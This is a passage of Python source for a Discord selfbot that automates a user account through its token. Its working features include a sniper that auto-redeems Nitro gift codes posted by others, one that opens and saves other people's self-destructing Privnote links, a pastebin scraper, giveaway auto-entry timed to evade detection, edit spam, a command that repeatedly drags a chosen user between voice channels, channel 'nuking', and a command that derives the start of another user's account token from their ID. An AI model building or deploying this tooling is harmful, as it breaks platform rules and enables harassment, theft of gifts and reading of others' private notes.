        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")

        await ctx.send(embed=embed)
    else:
        async for message in ctx.message.channel.history(limit=int(count)):
            try:
                await message.add_reaction(reaction)
            except:
                pass

@scalic.command(aliases=['editspam', 'massedit'])
async def spamedit(ctx, count=None,*, mesg=None):
    await ctx.message.delete()
    if count == None or mesg == None:
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Scalic Selfbot - Message edit spam", description=f"You didn't specify the amount of messages to edit or the content to edit the messages to.\n{prefix.strip()}spamedit [amount] [message]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")

        await ctx.send(embed=embed)
    else:
        edited = 0
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Scalic Selfbot - Message edit spam", description=f"Editing messages", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        msg= await ctx.send(embed=embed)
        async for message in ctx.channel.history(limit=int(count)):
            try:
                if message.author == scalic.user:
                    if message != msg:
                        await message.edit(content=mesg,embed=None)
                        edited = edited + 1
            except:
                pass

        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Scalic Selfbot - Message edit spam", description=f"Finished.\nEdited {edited} messages", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await msg.edit(embed=embed,delete_after=3)

@scalic.command(aliases=['token', 'halftoken'])
async def tokenhalf(ctx, member: discord.Member):#
    string = member.id
    string = str(string)
    data = base64.b64encode(string.encode())
    final = str(data).replace("'","")
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Message edit spam", description=f"{member.name}'s Token Begins With : \n`{final[1:]}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

    #ik i can simplise lots of this code but I like things to be clear and this is my way of style :)
@scalic.command(aliases=['deletedmessagelogger', 'deletedmessageslogger',"logdeleted","deletedlogger"])
async def logdeletedmessages(ctx,deletestatus=None):
    global deletedmessagelogger 
    if deletestatus == None:
        if deletedmessagelogger == "off":
            deletedmessagelogger = "on"
        elif deletedmessagelogger == "on":
            deletedmessagelogger = "off"
    else:
        if deletestatus.lower() == "off":
            deletedmessagelogger = "off"
        if deletestatus.lower() == "on":
            deletedmessagelogger = "on"

        if deletestatus.lower() == "true": #could i of made the code shorter : yes ... but i like it this way, more clearer to scroll past
            deletedmessagelogger = "on"
        if deletestatus.lower() == "false":
            deletedmessagelogger = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Deleted message logger", description=f"Deleted message logger is now : `{deletedmessagelogger}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['editedmessagelogger', 'editedmessageslogger','editlog','logedit',"editlogger"])
async def logediteddmessages(ctx,editstatus=None):
    global editedmessagelogger 
    if editstatus == None:
        if editedmessagelogger == "off":
            editedmessagelogger = "on"
        elif editedmessagelogger == "on":
            editedmessagelogger = "off"
    else:
        if editstatus.lower() == "off":
            editedmessagelogger = "off"
        if editstatus.lower() == "on":
            editedmessagelogger = "on"

        if editstatus.lower() == "true": #could i of made the code shorter : yes ... but i like it this way, more clearer to scroll past
            editedmessagelogger = "on"
        if editstatus.lower() == "false":
            editedmessagelogger = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Edited message logger", description=f"Edited message logger is now : `{editedmessagelogger}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)


@scalic.command(aliases=['editmode', 'editall'])
async def edit(ctx,editstatus=None):
    global statusofediting 
    if editstatus == None:
        if statusofediting == "off":
            statusofediting = "on"
        elif statusofediting == "on":
            statusofediting = "off"
    else:
        if editstatus.lower() == "off":
            statusofediting = "off"
        if editstatus.lower() == "on":
            statusofediting = "on"

        if editstatus.lower() == "true":
            statusofediting = "on"
        if editstatus.lower() == "false":
            statusofediting = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Edit mode", description=f"Edit mode is now : `{statusofediting}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)#

@scalic.command(aliases=['harotalk', 'talkharo',"haro","cutetalk"])
async def talkcute(ctx,talkcuteyems=None):
    global talkingcuteyems 
    if talkcuteyems == None:
        if talkingcuteyems == "off":
            talkingcuteyems = "on"
        elif talkingcuteyems == "on":
            talkingcuteyems = "off"
    else:
        if talkcuteyems.lower() == "off":
            talkingcuteyems = "off"
        if talkcuteyems.lower() == "on":
            talkingcuteyems = "on"

        if talkcuteyems.lower() == "true":
            talkingcuteyems = "on"
        if talkcuteyems.lower() == "false":
            talkingcuteyems = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Cute talk", description=f"Edit mode is now : `{talkingcuteyems}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['nitrosniper', 'snipenitro'])
async def nitrosnipe(ctx,snipestatus=None):
    global nitrosniping 
    if snipestatus == None:
        if nitrosniping == "off":
            nitrosniping = "on"
        elif nitrosniping == "on":
            nitrosniping = "off"
    else:
        if snipestatus.lower() == "off":
            nitrosniping = "off"
        if snipestatus.lower() == "on":
            nitrosniping = "on"

        if snipestatus.lower() == "true":
            nitrosniping = "on"
        if snipestatus.lower() == "false":
            nitrosniping = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Nitro Sniper", description=f"Nitro sniper is now : `{nitrosniping}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['privnotesniper', 'snipeprivnote'])
async def privnotesnipe(ctx,snipestatus=None):
    global privnotesniping 
    if snipestatus == None:
        if privnotesniping == "off":
            privnotesniping = "on"
        elif privnotesniping == "on":
            privnotesniping = "off"
    else:
        if snipestatus.lower() == "off":
            privnotesniping = "off"
        if snipestatus.lower() == "on":
            privnotesniping = "on"

        if snipestatus.lower() == "true":
            privnotesniping = "on"
        if snipestatus.lower() == "false":
            privnotesniping = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Privnote Sniper", description=f"Privnote sniper is now : `{privnotesniping}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['notificationson', 'notificationsoff',"notifs","notis","noti","alerts"])
async def notifications(ctx,notifstatushm=None):
    global notifsyems 
    if notifstatushm == None:
        if notifsyems == "off":
            notifsyems = "on"
        elif notifsyems == "on":
            notifsyems = "off"
    else:
        if notifstatushm.lower() == "off":
            notifsyems = "off"
        if notifstatushm.lower() == "on":
            notifsyems = "on"

        if notifstatushm.lower() == "true":
            notifsyems = "on"
        if notifstatushm.lower() == "false":
            notifsyems = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Notifications", description=f"Notifications are now : `{notifsyems}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

bumpstatus = "off"
@scalic.command(aliases=['autobump', 'bumpauto'])
async def bump(ctx,bumpingyuh=None):
    global bumpstatus 
    if bumpingyuh == None:
        if bumpstatus == "off":
            bumpstatus = "on"
        elif bumpstatus == "on":
            bumpstatus = "off"
    else:
        if bumpingyuh.lower() == "off":
            bumpstatus = "off"
        if bumpingyuh.lower() == "on":
            bumpstatus = "on"

        if bumpingyuh.lower() == "true":
            bumpstatus = "on"
        if bumpingyuh.lower() == "false":
            bumpstatus = "off"
    await ctx.send(f"`Autobump status : {bumpstatus}`",delete_after=3)
    while bumpstatus=="on":
        await ctx.send("!d bump")
        await asyncio.sleep(7201)

levelstatus = "off"
@scalic.command(aliases=['levelauto'])
async def autolevel(ctx,levelyuh=None):
    global levelstatus 
    if levelyuh == None:
        if levelstatus == "off":
            levelstatus = "on"
        elif levelstatus == "on":
            levelstatus = "off"
    else:
        if levelyuh.lower() == "off":
            levelstatus = "off"
        if levelyuh.lower() == "on":
            levelstatus = "on"

        if levelyuh.lower() == "true":
            levelstatus = "on"
        if levelyuh.lower() == "false":
            levelstatus = "off"
    await ctx.send(f"`Auto-level status : {levelstatus}`",delete_after=3)
    while levelstatus=="on":
        await ctx.send("** **")
        await asyncio.sleep(61)


@scalic.command(aliases=['giveawaysniper', 'snipegiveaway',"snipegw","gwsniper"])
async def giveawaysnipe(ctx,snipestatus=None):
    global giveawaysniping 
    if snipestatus == None:
        if giveawaysniping == "off":
            giveawaysniping = "on"
        elif giveawaysniping == "on":
            giveawaysniping = "off"
    else:
        if snipestatus.lower() == "off":
            giveawaysniping = "off"
        if snipestatus.lower() == "on":
            giveawaysniping = "on"

        if snipestatus.lower() == "true":
            giveawaysniping = "on"
        if snipestatus.lower() == "false":
            giveawaysniping = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Giveaway Sniper", description=f"Giveaway sniper is now : `{giveawaysniping}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['friendbackup', 'serverbackup',"backupfriends","backupservers","backupfull","fullbackup"])
async def backup(ctx,snipestatus=None):

    friendssaved = 0
    serverssaved = 0
    groupssaved = 0
    f = open(r'data/backup.txt','a')
    f.write(f"\n\n- - - - -  F R I E N D - - - B A C K U P - - - - - \n\n")
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Backup", description=f"Backing up friends...", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)
    for frend in scalic.user.friends:
        try:
            f.write(f"{frend.name}#{frend.discriminator}|{frend.id}\n") 
            friendssaved += 1
        except: #Special characters = Exception -  UnicodeEncodeError: 'charmap' codec can't encode characters
            f.write(f"Error writing friend name|{frend.id}\n")  #with their id its still possible to find people, so the backup is still useful!
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Backup", description=f"Saved `{friendssaved}` friends", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

    f.write(f"\n\n- - - - -  S E R V E R - - - B A C K U P - - - - - \n\n")

      #  try:
      #      invitelink = await random.choice(guild.text_channels).create_invite(max_uses=1,unique=True)   -this was really strange - kept unverifying my account email. Discord had some problems earlier today where people got false "suspicious login emails" but this unverified, not forced a pw reset. Something to look into for making exploits but for now I'll do it off requests
      #  except Exception as e:
      #      invitelink = f"Error creating invite link + {e}"

    payload = {
    'max_age': '0',
    'max_uses': '0',
    'temporary': False
    }
    headers = { 'authorization': token.strip() }
    for guild in scalic.guilds:
        await asyncio.sleep(2)
        try:
            invchannel = random.choice(guild.text_channels)
            inv = requests.post(f'https://discord.com/api/v6/channels/{invchannel.id}/invites', json = payload, headers = headers)

            try:
                invitecode = f"discord.gg/{str(inv.json()['code'])}"
                serverssaved += 1
            except:
                invitecode = "Error making invite - probably has a vanity"


            if invitecode == "50013": #seems to be an error from ratelimits
                await asyncio.sleep(10)
                invitecode = "Error making invite - seems to of been ratelimited"

            
            try:
                f.write(f"{guild.name}|{guild.id}|{invitecode}\n")

            except:
                f.write(f"Error writing guild name|{guild.id}|{invitecode}\n") #Special characters = Exception -  UnicodeEncodeError: 'charmap' codec can't encode characters

        except:
            pass

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Backup", description=f"Saved `{friendssaved}` friends and `{serverssaved}` servers", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)


    f.write(f"\n\n- - - - -  G R O U P C H A T - - - B A C K U P - - - - - \n\n")
    for cha in scalic.private_channels:
        if isinstance(cha, discord.GroupChannel):
            inv = requests.post(f'https://discord.com/api/v6/channels/{cha.id}/invites', json = {"max_age":86400}, headers = headers) #do daily backups if you plan on using the groups saved
            try:
                invitecode = f"discord.gg/{str(inv.json()['code'])}"
            except:
                invitecode = "Error making invite"
            groupssaved += 1
            try:
                f.write(f"{cha.name}|{cha.id}|{invitecode}\n")
            except:
                f.write(f"Error writing guild name|{cha.id}|{invitecode}\n") #Special characters = Exception -  UnicodeEncodeError: 'charmap' codec can't encode characters





    f.close()
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Backup", description=f"Saved `{friendssaved}` friends , `{serverssaved}` servers and `{groupssaved}` group chats.", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

    


@scalic.command(aliases=['pastebinsniper', 'snipepastebins',"pastesnipe","snipepaste","snipepastebin"])
async def pastebinsnipe(ctx,snipestatus=None):
    global pastebinsniping 
    if snipestatus == None:
        if pastebinsniping == "off":
            pastebinsniping = "on"
        elif pastebinsniping == "on":
            pastebinsniping = "off"
    else:
        if snipestatus.lower() == "off":
            pastebinsniping = "off"
        if snipestatus.lower() == "on":
            pastebinsniping = "on"

        if snipestatus.lower() == "true":
            pastebinsniping = "on"
        if snipestatus.lower() == "false":
            pastebinsniping = "off"

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Pastebin Sniper", description=f"Pastebin sniper is now : `{pastebinsniping}`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['sniper', 'snipersettings',"settingsniper","sniperon","sniperoff"])
async def snipe(ctx):
    global nitrosniping
    global privnotesniping
    global giveawaysniping
    global pastebinsniping
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Sniper Info", description=f"Nitro sniper status : `{nitrosniping}`\nPrivnote sniper status : `{privnotesniping}\n`Giveaway sniper status : `{giveawaysniping}`\nPastebin sniper status : `{pastebinsniping}`\nCommands : `{prefix.strip()}nitrosnipe`,`{prefix.strip()}privnotesnipe`,`{prefix.strip()}giveawaysnipe`,`{prefix.strip()}pastebinsnipe`", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['id', 'userid',"useridtoname"])
async def idtoname(ctx, personsid: int):
    if len(str(personsid)) != 18:
        await message.edit(content = f"**This command requires a user id - Turn on developers mode, get the id and run the command again!**")    
    else:
        user = await scalic.fetch_user(personsid)
        randcolor = random.randint(0x000000, 0xFFFFFF)
        embed=discord.Embed(title="Scalic Selfbot - Id to username", description=f"ID [{str(personsid)}]  = `{user.name}#{user.discriminator}`", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/dKfTyqLt1jkqIfiMXj/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.message.edit(content="",embed=embed)


@scalic.command(aliases=['movevcspam', 'spammove',"vcspammer"])
async def vcspam(ctx,channelone=None,channeltwo=None, personsid=None,amount=20):


    if channelone==None or channeltwo==None:
        await ctx.message.edit(content = f"**Try this command again but specify 2 server channel ids\n{prefix.strip()}vcspam [channelid1] [channelid2] [optional - userid] [optional - amount]**")  

    else:
        if personsid == None:
            personsid = str(ctx.message.author.id)

        elif len(str(personsid)) != 18:
            await ctx.message.edit(content = f"**You didn't supply a valid user id so I'm using yours!**",delete_after=2)    
            personsid = str(ctx.message.author.id)

        try:
            await ctx.message.delete()

        except:
            pass

        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}

        for scalic in range(int(amount)):
            requests.patch(f"https://discord.com/api/v8/guilds/{str(ctx.guild.id)}/members/{personsid}",headers=headers,json={"channel_id": channelone})
            data = requests.patch(f"https://discord.com/api/v8/guilds/{str(ctx.guild.id)}/members/{personsid}",headers=headers,json={"channel_id": channeltwo}).text


            if "rate limited" in data.lower(): 
                try:
                    j = json.loads(data)
                    ratelimit = j['retry_after']
                    timetowait = ratelimit / 1000
                    await asyncio.sleep(timetowait)

                except:
                    await asyncio.sleep(5)


@scalic.command(aliases=['asci','cooltext',])
async def ascii(ctx, *,paste=f"Format is {prefix.strip()}ascii [text]"):

    if paste == f"Format is {prefix.strip()}ascii [text]":
        await ctx.message.edit(content=paste)
    else:
        finaltext = paste.replace(" ", "+")
        asciiresponse = requests.get(f"http://artii.herokuapp.com/make?text={finaltext}&font=rounded") 
        await ctx.message.edit(content=f" ``` {asciiresponse.text} ``` ")


@scalic.command(aliases=['haste','paste'])
async def hastebin(ctx, *,paste=f"Format is {prefix.strip()}hastebin [text]"):
    try:
        data = requests.post(f"https://hastebin.com/documents",timeout=3,data=paste).text
        textlink = "https://hastebin.com/"      
    except:  #hastebin is often used so much, using the except i can use a similar reliable service
        await ctx.message.edit(content=f"_https://hastebin.com/documents is having problems - switching to https://paste.pythondiscord.com/documents_")
        await asyncio.sleep(1)
        data = requests.post(f"https://paste.pythondiscord.com/documents",data=paste).text
        textlink = "https://paste.pythondiscord.com/"

    j = json.loads(data)
    endoflink = j['key']

    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Hastebin Command", description=f"Here's your paste!\n{textlink}{endoflink}", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/dKfTyqLt1jkqIfiMXj/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await ctx.message.edit(content="",embed=embed)

@scalic.command(aliases=['channelnuke','nukechannel',])
async def nuke(ctx):

    channel_position = ctx.channel.position
    new_chan = await ctx.channel.clone()
    await ctx.channel.delete()
    await new_chan.edit(position = channel_position) 
    randcolor = random.randint(0x000000, 0xFFFFFF)
    embed=discord.Embed(title="Scalic Selfbot - Channel Nuked", description=f"<#{new_chan.id}> - {new_chan.name} has been nuked", color=randcolor)
    embed.set_thumbnail(url="https://media.giphy.com/media/dKfTyqLt1jkqIfiMXj/giphy.gif")
    embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
    await new_chan.send(embed=embed,delete_after=10)

@scalic.event
async def on_message(ctx):
    global edit
    global nitrosniping
    global privnotesniping
    global giveawaysniping
    global pastebinsniping
    global deleteafter
    global deleteaftertime
    global mimicstatus
    global whotomimic
    global commandsdone
    global messagessent
    global talkingcuteyems
    global isafk
    global messagetosendwhenafk
    global notifsyems

    if nitrosniping == "on":
        try:
            if 'discord.gift' in ctx.content: 
                nitrotext = open("Log/nitrolog.txt","a") 
                code = re.search("discord.gift/(.*)", ctx.content).group(1)

                try:
                    nitrotext.write(f"[!] Nitro Found! // Server: {ctx.guild.name} // Channel: {ctx.channel.name} // Sent By: {ctx.author.name}#{ctx.author.discriminator}\n")
                except:
                    nitrotext.write(f"[!] Nitro Found! Sent By: {ctx.author.name}#{ctx.author.discriminator}\n")
                if len(code) == 24 or len(code) == 16:
                    result = requests.post('https://discordapp.com/api/v6/entitlements/gift-codes/'+code+'/redeem', json={"channel_id":str(ctx.channel.id)}, headers={'authorization':token.strip()}).text
                    code = re.search("discord.gift/(.*)", ctx.content).group(1)

                    if 'this gift has been redeemed already.' in result.lower():
                        nitrotext.write(f"[-] discord.gift/{code} Has already been claimed\n")
                    elif 'nitro' in result.lower():
                        nitrotext.write(f"[+] discord.gift/{code} WAS SNIPED!!!\n")
                    elif 'unknown gift code' in result.lower():
                        nitrotext.write(f"[-] discord.gift/{code} Was an invalid code\n")
                else:
                    nitrotext.write(f"[-] discord.gift/{code} Was a fake code\n") 
                nitrotext.close()
        except:
            pass
    if pastebinsniping == "on":
        try:
            if 'pastebin' in ctx.content: #while it cant exactly be "sniped" - people still drop stuff in pastebin from time to time that you might not see , depending on whether its a method or sum, still usefull to have imo
        
                code = re.search("pastebin.com/(.*)", ctx.content).group(1) 
                if len(code) == 8:
                    pasteresult = requests.get(f"https://pastebin.com/raw/{code}")
                    if pasteresult.status_code != 404: 
                        with open(f'Pastebin/{code}.txt', 'w+') as pastebinsave:
                            pastebinsave.write(f"[+] Results from pastebin.com/{code}:\n\n{pasteresult.text}")
                            pastebinsave.close()
        except:
            pass




    if giveawaysniping == "on":
        try:
            if 'giveaway' in str(ctx.content).lower():
                if ctx.author.id == 294882584201003009  or ctx.author.id == 673918978178940951 or ctx.author.id == 716967712844414996 or ctx.author.id == 582537632991543307 or ctx.author.id == 450017151323996173 or ctx.author.id == 574812330760863744:
                    await asyncio.sleep(8) # so yall dont get accused of sniping giveaways but still enter all - min gw time for the big giveaway bot is 10 seconds
                    await ctx.add_reaction("🎉")
                    gwlog = open("Log/gwlog.txt","a") 
                    try:
                        gwlog.write(f"[!] Giveaway Entered! // Server: {ctx.guild.name} // Channel: {ctx.channel.name} // Bot: {ctx.author.name}#{ctx.author.discriminator} \n")
                    except:
                        gwlog.write(f"[+] Giveaway Entered : Server/Channel Not writable because of characters used :| //  Bot: {ctx.author.name}#{ctx.author.discriminator} \n[+] Message: {ctx.content}\n")
                
        except:
            pass

        if f'<@{scalic.user.id}>' in str(ctx.content): #
            if ctx.author.id == 294882584201003009 or ctx.author.id == 673918978178940951 or ctx.author.id == 716967712844414996 or ctx.author.id == 582537632991543307 or ctx.author.id == 450017151323996173 or ctx.author.id == 574812330760863744:
                gwlog = open("Log/gwlog.txt","a")
                try:
                    gwlog.write(f"[+] Giveaway Won: {ctx.guild.name} // Channel: {ctx.channel.name} //  Bot: {ctx.author.name}#{ctx.author.discriminator}\n[+] Message: {ctx.content}\n")
                except:
                    gwlog.write(f"[+] Giveaway Won: Server/Channel Not writable because of characters used :| //  Bot: {ctx.author.name}#{ctx.author.discriminator}\n[+] Message: {ctx.content}\n")

    if privnotesniping == "on":
        try:
            if 'privnote' in ctx.content: 
        
                code = re.search("privnote.com/(.*)", ctx.content).group(1) 
                try:
                    privnotesnipe = pn.read_note(f"https://privnote.com/{code}")
                    with open(f'Privnote/{code}.txt', 'w+') as pastebinsave:
                        pastebinsave.write(f"[+] Results from privnote.com/{code}:\n\n{privnotesnipe}")
                        pastebinsave.close()
                except:
                    pass
        except:
            pass

    if notifsyems == "on":
        if str(scalic.user.id) in str(ctx.content):
            toast = ToastNotifier()
            if ctx.guild != None:                                                                                       #i replace scalic user.id with name just so its clearer if the message pure content is pinging u and u dont know about ids and stuff
                toast.show_toast(f"{scalic.user.name} - You got mentioned in {ctx.guild.name}",f"{ctx.channel.name} : {ctx.content.replace(str(scalic.user.id),scalic.user.name)}",duration=2,icon_path=f"./data/{str(scalic.user.id)}.ico")
                #


    if ctx.author.id == scalic.user.id:
        messagessent += 1
        if ctx.content.startswith(prefix.strip()):
            commandsdone += 1

        if deleteafter == "on":
            try:
                await asyncio.sleep(int(deleteaftertime))
                await ctx.delete()
            except Exception as e:
                # print(e)
                pass
    
        if talkingcuteyems == "on":
            try:
                cutiemsg = ctx.content.replace("yes","yems").replace("yeah","yemmers")
                cutiemsg = cutiemsg.replace("block","plock")
                cutiemsg = cutiemsg.replace("fuck","pluc")
                cutiemsg = cutiemsg.replace("cutie","cootie").replace("cute","coot").replace("cutey","cooty")
                cutiemsg = cutiemsg.replace("what","wa")
                cutiemsg = cutiemsg.replace("leave","leaf")
                cutiemsg = cutiemsg.replace("offence","of fence")
                cutiemsg = cutiemsg.replace("pls","plims").replace("please","plims")
                cutiemsg = cutiemsg.replace("bro","bryo") 
                cutiemsg = cutiemsg.replace("give","gib") 
                cutiemsg = cutiemsg.replace("mine","mien") 
                cutiemsg = cutiemsg.replace("here","heer") 
                cutiemsg = cutiemsg.replace("alone","alon") 
                cutiemsg = cutiemsg.replace("idiot","idot sammich") 
                cutiemsg = cutiemsg.replace("i am","am") 
                await ctx.edit(content=cutiemsg)
            except:
                pass

        if statusofediting == "on":
            try:
                await ctx.edit(content=f"{ctx.content} ")
            except:
                pass

    if mimicstatus == "on":
        if ctx.author.id == whotomimic:
            try:
                await ctx.channel.send(ctx.content.replace("@","@\u200b")) #prevents from mass pinging 
            except Exception as e:
#                print(e)
                pass

    if ctx.guild == None:  
        if isafk == "on":
            if ctx.author.id != scalic.user.id:
                try:
                    await ctx.channel.send(messagetosendwhenafk)
                except:
                    pass

    await scalic.process_commands(ctx)

@scalic.event
async def on_message_delete(ctx):
    global deletedmessagelogger
    if deletedmessagelogger == "on":
        if ctx.guild == None:
            if ctx.author.id != scalic.user.id:
                if len(str(ctx.content)) != 0: #if theyre using a sb itll show nothing so yuh
                    try:
                        await ctx.channel.send(f"**Message logged by {ctx.author.mention} : ** \n{ctx.content}")
                    except:
                        pass

@scalic.event
async def on_message_edit(before,after):
    global editedmessages
    global editedmessagelogger
    editedmessages.update({after.channel.id: before.content.replace("@","@\u200b")}) #this needs working on
    if editedmessagelogger == "on":
        if after.guild == None:
            if after.author.id != scalic.user.id:
                if before.content != after.content: #embeds sometimes mess with it
                    try:
                        await after.channel.send(f"**Message edited by {after.author.mention} : ** \n**Before : **{before.content}\n**After : **{after.content}")
                    except:
                        pass
    

@scalic.command(aliases=["shorten","urlshorten"])
async def tinyurl(ctx,link=None):
    randcolor = random.randint(0x000000, 0xFFFFFF)
    await ctx.message.delete()
    if link == None:
        embed=discord.Embed(title=f"Scalic Selfbot - Url shortener", description=f"You didn't supply a link - {prefix.strip()}tinyurl [link-here]", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        message = await ctx.send(embed=embed)
    else:
        embed=discord.Embed(title=f"Scalic Selfbot - Shortening link", description=f"beep bop beep", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        message = await ctx.send(embed=embed)

        randcolor = random.randint(0x000000, 0xFFFFFF)
        shortened = requests.get(f"https://tinyurl.com/api-create.php?url={link}").text
        embed=discord.Embed(title=f"Scalic Selfbot - Url shortener", description=f"Link shortened : \n{shortened}", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        message = await ctx.send(embed=embed)

@scalic.command(aliases=['server',"joinserver","serverjoin"])
async def join(ctx,link=None):#
    await ctx.message.delete()
    if link == None:
        embed=discord.Embed(title=f"Scalic Selfbot - Server joiner", description=f"You didn't supply an invite - {prefix.strip()}join discord.gg/server", color=randcolor)
        embed.set_thumbnail(url="https://media.giphy.com/media/YpGPs0rAJQC1lngD0R/giphy.gif")
        embed.set_footer(text="https://github.com/scalic/scalic-selfbot")
        await ctx.send(embed=embed)
    else:
        headers = {'Authorization': token.strip(), 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36', 'Accept': '*/*',}

        link = link.replace("https://discord.gg/","")
        link = link.replace("discord.gg/","")
        link = link.replace("https://discord.com/invite/","")
        link = link.replace("https://discord.com/","")
        #i like doing it line by line so dont judge ok thanks
        randcolor = random.randint(0x000000, 0xFFFFFF)
